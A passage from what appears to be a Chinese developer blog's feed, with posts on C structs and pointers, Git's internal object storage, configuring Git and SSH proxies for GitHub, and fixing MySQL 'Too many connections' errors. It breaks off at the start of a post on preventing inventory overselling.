class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>定义一个结构体变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">student1</span> = &#123;</span><span class="number">1001</span>, <span class="string">"boo"</span>, <span class="number">23</span>&#125;;</span><br></pre></td></tr></table></figure><p>定义一个结构体数组变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">sarr</span>[3] = &#123;</span></span><br><span class="line">    <span class="number">1001</span>, <span class="string">"boo"</span>, <span class="number">23</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>.</code> 操作符用来访问结构体变量，<code>-&gt;</code> 操作符用来访问指针的成员。</p><h3 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h3><p>结构体指针就是结构体变量所占据的内存段的起始地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 定义一个结构体</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">student1</span> = &#123;</span><span class="number">1002</span>, <span class="string">"boo"</span>, <span class="number">23</span>&#125;;</span><br><span class="line">    <span class="comment">// 定义一个结构体指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span> * <span class="title">p</span>;</span></span><br><span class="line">    p = &amp;student1;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问结构体指针</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %s %d \n"</span>, p-&gt;id, p-&gt;name, p-&gt;age);        <span class="comment">// 通过指针的成员选择进行访问</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %s %d \n"</span>, (*p).id, (*p).name, (*p).age);  <span class="comment">// 通过指针对象的成员进行访问</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="typedef"><a href="#typedef" class="headerlink" title="typedef"></a>typedef</h3><p>比如如果需要定义一个结构体变量，每次都需要写一个 <code>struct xxx</code>，这个显然是很麻烦的事情。</p><p><code>typedef</code> 关键字的作用就是声明新的类型名来代替已有的类型名。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个结构体，顺带定义一个别名</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">&#125; stu,* pstu;</span><br><span class="line"></span><br><span class="line"><span class="comment">// stu 等价于 struct student</span></span><br><span class="line"><span class="comment">// * pstu 等价于 struct student *</span></span><br></pre></td></tr></table></figure><h2 id="C-引用"><a href="#C-引用" class="headerlink" title="C++引用"></a>C++引用</h2><p>C++ 的引用其实就是在子函数中改变主函数的某个变量的值。<br>C 也可以做到，只不过相比起来 C++ 的写法更简洁一些。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改整型</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify_num</span><span class="params">(<span class="keyword">int</span> &amp;i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    i = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改指针</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify_pointer</span><span class="params">(<span class="keyword">int</span> *&amp;p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    p = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="comment">// 为什么这里可以直接给 p[0] 赋值？因为使用 malloc 申请的是一块连续的空间，返回的是这块空间的首地址。</span></span><br><span class="line">    <span class="comment">// p[0] = 9;</span></span><br><span class="line">    *p = <span class="number">9</span>;       <span class="comment">// 指针的传递</span></span><br><span class="line">    *(p+<span class="number">1</span>) = <span class="number">2</span>;   <span class="comment">// 指针的偏移</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    modify_num(i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"i = %d \n"</span>, i);      <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    modify_pointer(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p[0] = %d \n"</span>, p[<span class="number">0</span>]);  <span class="comment">// 9</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p[1] = %d \n"</span>, p[<span class="number">1</span>]);  <span class="comment">// 2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>.git 探秘 — 认识 Git 对象</title>
      <link href="/git-exploring-%E2%80%94-getting-to-know-git-objects/"/>
      <url>/git-exploring-%E2%80%94-getting-to-know-git-objects/</url>
      
        <content type="html"><![CDATA[<p>从根本上来讲git是一个内容寻址（content-addressable）文件系统，并在此之上提供了一个版本控制系统的用户界面。</p><a id="more"></a><p>所有的 git 仓库的根目录下面都有个 <code>.git</code> 文件, 它默认是隐藏的，<code>.git</code> 文件夹结构如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220502145745.png" alt=""></p><p>各文件里面存储的内容：</p><table><thead><tr><th>文件夹</th><th>类型</th><th>作用</th></tr></thead><tbody><tr><td>hooks</td><td>文件夹</td><td>包含客户端或服务端的钩子脚本; 我们最常用的就是pre-commit钩子了</td></tr><tr><td>info</td><td>文件夹</td><td>包含一个全局性排除文件</td></tr><tr><td>logs</td><td>文件夹</td><td>保存日志信息; git reflog 展示的内容</td></tr><tr><td>objects</td><td>文件夹</td><td>目录存储所有数据内容, 这就是实际意义上的 git数据库, 存数据的地方; 并且存了所有的历史记录</td></tr><tr><td>refs</td><td>文件夹</td><td>目录存储指向数据（分支、远程仓库和标签等）的提交对象的指针</td></tr><tr><td>config</td><td>文件</td><td>包含当前项目特有的配置选项</td></tr><tr><td>description</td><td>文件</td><td>用来显示对仓库的描述信息,文件仅供 GitWeb 程序使用，我们无需关心</td></tr><tr><td>HEAD</td><td>文件</td><td>它文件通常是一个符号引用（symbolic reference），指向目前所在的分支。某些罕见的情况下，HEAD 文件可能会包含一个 git 对象的 SHA-1 值</td></tr><tr><td>index</td><td>文件夹</td><td>文件保存暂存区信息</td></tr><tr><td>FETCH_HEAD</td><td>文件</td><td>git fetch; 这将更新git remote 中所有的远程repo 所包含分支的最新commit-id, 将其记录到.git/FETCH_HEAD文件中</td></tr><tr><td>packed-refs</td><td>文件</td><td>对refs打包后(git gc)的存储文件, 与底层命令git pack-refs</td></tr></tbody></table><p>所有的数据对象均存储于项目下面的 <code>.git/objects</code> 目录中，那么<code>.git/objects</code> 文件夹里面究竟存了些什么？</p><h2 id="Git-对象"><a href="#Git-对象" class="headerlink" title="Git 对象"></a>Git 对象</h2><p>版本库中的每一个文件，不论是图片、源文件还是二进制文件，都被映射为一个 Blob 对象。除了 Blob 对象，在 Git 的文件系统中还存储着另外三种数据对象：</p><ol><li>树对象(tree)</li><li>提交对象(commit)</li><li>标签对象(tag)</li></ol><h3 id="Blob-对象"><a href="#Blob-对象" class="headerlink" title="Blob 对象"></a>Blob 对象</h3><p>Blob 是英文 Binary large object 的缩写，一个 Blob 对象就是一段二进制数据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> -n <span class="string">"print 'hello git'"</span> &gt; index.md</span><br><span class="line">$ git add index.md</span><br><span class="line">$ find .git/objects -<span class="built_in">type</span> f</span><br><span class="line">.git/objects/pack/pack-d9624c66acb04fcc36857b02d1d36590efb8d18f.pack</span><br><span class="line">.git/objects/pack/pack-d9624c66acb04fcc36857b02d1d36590efb8d18f.idx</span><br><span class="line">.git/objects/42/a3276feefd4f52d48aa831db535d6e81b6e0fb</span><br></pre></td></tr></table></figure><p>查看数据对象的类型：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git cat-file -t 42a3276feefd4f52d48aa831db535d6e81b6e0fb</span><br><span class="line">blob</span><br></pre></td></tr></table></figure><p>查看数据对象的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git cat-file -p 42a3276feefd4f52d48aa831db535d6e81b6e0fb</span><br><span class="line"><span class="built_in">print</span> <span class="string">'hello git'</span>%</span><br></pre></td></tr></table></figure><p>为了把文件映射为 Blob 对象，Git 做了下面这些工作：</p><ol><li>读取文件内容，添加一段特殊标记到头部，得到新的内容，记为 content；</li><li>对该 content 执行 SHA-1 加密，得到一个长度为40字符的 hash 值，例如 64fe72272a79bff953d7de2062d3f52b4679c659；</li><li>取该 hash 值的前两位作为子目录，剩下的38位作为文件名，在本例中，子目录名是’64/‘，文件名是’fe72272a79bff953d7de2062d3f52b4679c659’；</li><li>对 content 执行 zip 压缩，得到新的二进制内容，存入文件中。</li></ol><h3 id="Tree-对象"><a href="#Tree-对象" class="headerlink" title="Tree 对象"></a>Tree 对象</h3><p>Git 使用一种与 UNIX 文件系统相似的方式来管理内容，Blob 相当于磁盘文件，Tree 则相当于文件夹。Tree 中既可以包含 Blob，也可以包含其他 Tree。</p><p>向版本库中提交当前的修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m <span class="string">"first commit"</span></span><br></pre></td></tr></table></figure><p>会发现 <code>.git/objects</code> 目录下面多出了两个对象：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find .git/objects -<span class="built_in">type</span> f</span><br><span class="line">.git/objects/93/292574c965d7ecd25f933fdadb646dce75cc24</span><br><span class="line">.git/objects/pack/pack-d9624c66acb04fcc36857b02d1d36590efb8d18f.pack</span><br><span class="line">.git/objects/pack/pack-d9624c66acb04fcc36857b02d1d36590efb8d18f.idx</span><br><span class="line">.git/objects/42/a3276feefd4f52d48aa831db535d6e81b6e0fb</span><br><span class="line">.git/objects/30/31cddff73840bd5e7822c9b7f3b538e7e160bb</span><br></pre></td></tr></table></figure><p>这两个对象的类型分别是 commit 和 tree：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git cat-file -t 93292574c965d7ecd25f933fdadb646dce75cc24</span><br><span class="line">tree</span><br><span class="line"></span><br><span class="line">git cat-file -t 3031cddff73840bd5e7822c9b7f3b538e7e160bb</span><br><span class="line">commit</span><br></pre></td></tr></table></figure><p>查看 93292574c965d7ecd25f933fdadb646dce75cc24 这个对象的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git cat-file -p 93292574c965d7ecd25f933fdadb646dce75cc24</span><br><span class="line">...</span><br><span class="line">100644 blob 42a3276feefd4f52d48aa831db535d6e81b6e0fbindex.md</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可见这颗树就相当于项目的根目录。</p><h3 id="Commit-对象"><a href="#Commit-对象" class="headerlink" title="Commit 对象"></a>Commit 对象</h3><p>一个 Commit 对象代表了一次提交对象，它包含了下面这些信息：</p><ul><li>何人何时作了该次提交</li><li>该次提交的简略说明</li><li>一棵树</li><li>父级 Commit 对象</li></ul><p>其中，这颗树也被称作项目快照（snapshort），通过项目快照，我们可以把项目还原成项目在该次提交时的样子。一般来说，commit 对象总有一个父级 commit 对象，一个又一个 commit 对象通过这种方式链接起来，就构成了一条提交历史。第一次提交的 commit 对象没有父级 commit 对象，分支合并所产生的新的 commit 对象可以有两个或者多个父级 commit 对象。</p><p>例如，3031cddff73840bd5e7822c9b7f3b538e7e160bb 这个 Commit 对象的内容为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git cat-file -p 3031cddff73840bd5e7822c9b7f3b538e7e160bb</span><br><span class="line">tree 93292574c965d7ecd25f933fdadb646dce75cc24</span><br><span class="line">parent 3c46f2d56ee15502cabeda97d6f44a95289c8804</span><br><span class="line">author Boo &lt;aikangtongxue@gmail.com&gt; 1651542437 +0800</span><br><span class="line">committer Boo &lt;aikangtongxue@gmail.com&gt; 1651542437 +0800</span><br><span class="line"></span><br><span class="line">first commit</span><br></pre></td></tr></table></figure><p>此时版本库中，Commit、Tree、Blob 三者之间的关系如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220503103534.png" alt=""></p><h3 id="Tag-对象"><a href="#Tag-对象" class="headerlink" title="Tag 对象"></a>Tag 对象</h3><p>Tag 指向一次特征提交。</p><p>在 Git 中有两种 tag，第一种 tag 并不在 <code>.git/objects</code> 目录下面创建新的对象，只是在 <code>.git/refs/tags</code> 目录中新建一个文件，文件的内容就是所指向的 commit 对象的 hash 值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git tag v0.1</span><br><span class="line">$ find .git/refs/tags -<span class="built_in">type</span> f</span><br><span class="line">.git/refs/tags/v0.1</span><br><span class="line">$ cat .git/refs/tags/v0.1</span><br><span class="line">3031cddff73840bd5e7822c9b7f3b538e7e160bb</span><br></pre></td></tr></table></figure><p>另一种 tag 则会在 <code>.git/objects</code> 目录下面创建对象，这种 tag 被称作注解标签（annotated tag）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ git tag -a v0.2 -m <span class="string">"Version 0.2"</span></span><br><span class="line">$ find .git/objects -<span class="built_in">type</span> f</span><br><span class="line">.git/objects/93/292574c965d7ecd25f933fdadb646dce75cc24</span><br><span class="line">.git/objects/pack/pack-d9624c66acb04fcc36857b02d1d36590efb8d18f.pack</span><br><span class="line">.git/objects/pack/pack-d9624c66acb04fcc36857b02d1d36590efb8d18f.idx</span><br><span class="line">.git/objects/42/a3276feefd4f52d48aa831db535d6e81b6e0fb</span><br><span class="line">.git/objects/30/31cddff73840bd5e7822c9b7f3b538e7e160bb</span><br><span class="line">.git/objects/<span class="built_in">cd</span>/542f02e1b07b78a11534c68b1d334365effc65</span><br></pre></td></tr></table></figure><p>查看数据对象类型及内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ git cat-file -t cd542f02e1b07b78a11534c68b1d334365effc65</span><br><span class="line">tag</span><br><span class="line">$ git cat-file -p cd542f02e1b07b78a11534c68b1d334365effc65</span><br><span class="line">object 3031cddff73840bd5e7822c9b7f3b538e7e160bb</span><br><span class="line"><span class="built_in">type</span> commit</span><br><span class="line">tag v0.2</span><br><span class="line">tagger Boo &lt;aikangtongxue@gmail.com&gt; 1651543206 +0800</span><br><span class="line"></span><br><span class="line">Version 0.2</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在 Git 的底层，有四种数据结构，它们分别是：</p><ul><li>Blob</li><li>Tree</li><li>Commit</li><li>Tag</li></ul><p>Git 把版本库中的每一个文件都转换为一个 blob 对象进行存储，而用 tree 对象来表达文件的层次结构。</p><p>Commit 对象代表了一次提交操作，它包含了当前的项目快照以及提交人和提交日期等诸多信息。所有的 commit 对象串接起来，组成一个有向无环图。从版本控制的角度看，这些 commit 对象构成了一个完整的版本提交记录；从项目开发的角度看，它们描述了项目是如何从无到有一点一滴地构建起来的。</p><p>Tag 对象指向一个 commit 对象，我们可以通过 tag 对象快速访问到项目的某一次特征提交。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.jianshu.com/p/fa31ef8814d2" target="_blank" rel="noopener">Git 之术与道 – 对象</a></li><li><a href="https://git-scm.com/book/zh/v2/Git-内部原理-Git-对象" target="_blank" rel="noopener">Git 内部原理 - Git 对象</a></li><li><a href="https://juejin.cn/post/7024922528514572302" target="_blank" rel="noopener">git仓库清理–”保姆级”教程</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git 设置和取消代理</title>
      <link href="/git-set-and-cancel-proxy/"/>
      <url>/git-set-and-cancel-proxy/</url>
      
        <content type="html"><![CDATA[<p>在使用 Git 时，经常会需要克隆仓库，有时候是国内的仓库，有时候是国外的仓库，如果直接强制让终端走代理，那么当克隆国内仓库时，速度可能特别慢。</p><p>这个时候其实可以只针对部分域名进行代理设置，而其他域名则不用走代理。</p><a id="more"></a><h3 id="https-代理"><a href="#https-代理" class="headerlink" title="https 代理"></a>https 代理</h3><p>针对所有 https 请求生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global https.proxy https://127.0.0.1:1080</span><br></pre></td></tr></table></figure><p>取消设置代理：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br></pre></td></tr></table></figure><p>只针对 <code>github.com</code> 生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.https://github.com.proxy socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure><p>取消设置代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> http.https://github.com.proxy</span><br></pre></td></tr></table></figure><h3 id="ssh-代理"><a href="#ssh-代理" class="headerlink" title="ssh 代理"></a>ssh 代理</h3><p>需要修改 <code>~/.ssh/config</code>文件，如果没有，新建一个。</p><p>macOS 下，同样仅为 <code>github.com</code> 设置代理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">    User git</span><br><span class="line">    ProxyCommand nc -v -x 127.0.0.1:1086 %h %p</span><br></pre></td></tr></table></figure><p>如果是在 Windows 下，设置代理命令会有所不同：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">    User git</span><br><span class="line">    ProxyCommand connect -S 127.0.0.1:1086 %h %p</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://gist.github.com/laispace/666dd7b27e9116faece6" target="_blank" rel="noopener">git 设置和取消代理</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql Too many connections 异常记录</title>
      <link href="/mysql-too-many-connections-exception-record/"/>
      <url>/mysql-too-many-connections-exception-record/</url>
      
        <content type="html"><![CDATA[<p>前段时间，线上业务偶尔会出现 <code>SQLSTATE[HY000] [1040] Too many connections</code> 的异常。</p><p>通常是以下两种原因之一造成的：</p><ol><li><p><code>max_connections</code> 配置过小</p></li><li><p>访问量过高</p><a id="more"></a></li></ol><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="max-connections"><a href="#max-connections" class="headerlink" title="max_connections"></a>max_connections</h3><p>Mysql 的 <a href="https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_max_connections" target="_blank" rel="noopener">max_connections</a> 是限制允许客户端同时连接的最大连接数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;%max_connections%&#39;;</span><br><span class="line">+-----------------+-------+</span><br><span class="line">| Variable_name   | Value |</span><br><span class="line">+-----------------+-------+</span><br><span class="line">| max_connections | 500   |</span><br><span class="line">+-----------------+-------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>Mysql 无论如何都会保留一个用于管理员（SUPER）登陆的连接，用于管理员连接数据库进行维护操作，所以即便当前连接数已经达到了 <code>max_connections</code>，管理员仍可以连接，因此 Mysql 的实际最大可连接数为 <code>max_connections+1</code>。</p><p>增加 <code>max_connections</code> 参数的值，不会占用太多系统资源。系统资源（CPU、内存）的占用主要取决于查询的密度、效率等。</p><h3 id="Max-used-connections"><a href="#Max-used-connections" class="headerlink" title="Max_used_connections"></a>Max_used_connections</h3><p>Mysql 的 <a href="https://dev.mysql.com/doc/refman/8.0/en/server-status-variables.html#statvar_Max_used_connections" target="_blank" rel="noopener">Max_used_connections</a> 是自服务器启动以来同时使用的最大连接数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global status like &#39;Max_used_connections&#39;;</span><br><span class="line">+----------------------+-------+</span><br><span class="line">| Variable_name        | Value |</span><br><span class="line">+----------------------+-------+</span><br><span class="line">| Max_used_connections | 101   |</span><br><span class="line">+----------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>通过查看这个值，我们就能知道是否需要调整 <code>max_connections</code>。</p><p>对于 Mysql 最大连接数值的设置范围比较理想的是：服务器响应的最大连接数值占服务器上限连接数值的比例值在10%以上，如果在10%以下，说明最大连接上限值设置过高，反之如果服务器响应的最大连接数值与上限连接数值很接近，则说明最大连接上限值设置过低。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>如果业务量并不大，没有高并发等场景，大部分情况下都是第一种原因，这也是最简单的解决方案，直接修改最大连接数量。<br>如果是因为访问量过高，这个时候就需要考虑增加从服务器或分散读压力了（不在本文谈论范围）。</p><p>通常修改最大连接数量有两种方式：</p><ol><li>直接通过命令行进行修改：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set global max_connections &#x3D; 1000;</span><br></pre></td></tr></table></figure></li></ol><p>使用这种方式需要注意的是，更新之后的最大连接数量，只在 Mysql 当前服务进程有效，也就是说一旦重启 Mysql，又会恢复到初始状态。因为 Mysql 启动后的初始化工作是从其配置文件中读取数据的，而这种方式没有对其配置文件做更改。</p><ol start="2"><li>修改配置文件：</li></ol><p>找到 <code>my.ini</code> 或 <code>my.cnf</code> 配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max_connections&#x3D;1000</span><br></pre></td></tr></table></figure><p>重启 Mysql 即可。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://dev.mysql.com/doc/refman/8.0/en/too-many-connections.html" target="_blank" rel="noopener">Mysql Too many connections</a></li><li><a href="https://www.yisu.com/zixun/38410.html" target="_blank" rel="noopener">mysql 最大连接数概念、作用及修改</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>库存超出常见解决方案整理</title>
      <link href="/inventory-beyond-common-solution-collation/"/>
      <url>/inventory-beyond-common-solution-collation/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文链接：<a href="https://learnku.com/articles/57959" target="_blank" rel="noopener">使用laravel解决库存超出的几个方案</a></p></blockquote><p>库存超出是一个常见的幂等问题，下面介绍一下解决超卖问题常见的一些方案</p><ul><li>Redis 存储库存</li><li>Redis 原子锁</li><li>Mysql 悲观锁 </li><li>Mysql 乐观锁</li></ul><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>准备一张实验表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+-------+------------------+------+-----+---------+----------------+</span><br><span class="line">| Field | Type             | Null | Key | Default | Extra          |</span><br><span class="line">+-------+------------------+------+-----+---------+----------------+</span><br><span class="line">| id    | int(11) unsigned | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| name  | varchar(10)      | YES  |     | NULL    |                |</span><br><span class="line">| num   | int(11)          | YES  |     | NULL    |                |</span><br><span class="line">+-------+------------------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure><p>使用 <code>go</code> 模拟并发：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 